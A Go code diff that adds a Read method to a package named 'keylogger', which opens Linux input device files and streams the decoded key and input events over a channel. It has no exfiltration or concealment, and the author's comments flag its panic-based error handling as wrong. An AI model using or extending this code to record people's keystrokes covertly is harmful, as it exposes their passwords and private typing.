@@ -2,8 +2,11 @@
 package keylogger
 
 import (
+	"bytes"
+	"encoding/binary"
 	"fmt"
 	"io/ioutil"
+	"os"
 )
 
 const (
@@ -41,4 +44,40 @@ func NewKeyLogger(deviceName string) *KeyLogger {
 	return &KeyLogger{
 		inputDevices: devs,
 	}
+}
+
+// Read starts logging the input events of the devices in the KeyLogger
+func (kl *KeyLogger) Read() (chan InputEvent, error) {
+	read := make(chan InputEvent, 128)
+
+	for _, dev := range kl.inputDevices {
+		fd, err := os.Open(fmt.Sprintf(deviceFile, dev.ID))
+		if err != nil {
+			close(read)
+			return read, fmt.Errorf("error opening device file: %v", err)
+		}
+
+		go func() {
+			tmp := make([]byte, eventSize)
+			event := InputEvent{}
+			for {
+				n, err := fd.Read(tmp)
+				if err != nil {
+					close(read)
+					panic(err) // don't think this is right here
+				}
+				if n <= 0 {
+					continue
+				}
+
+				if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
+					panic(err) // again, not right
+				}
+
+				read <- event
+			}
+		}()
+
+	}
+	return read, nil
 }
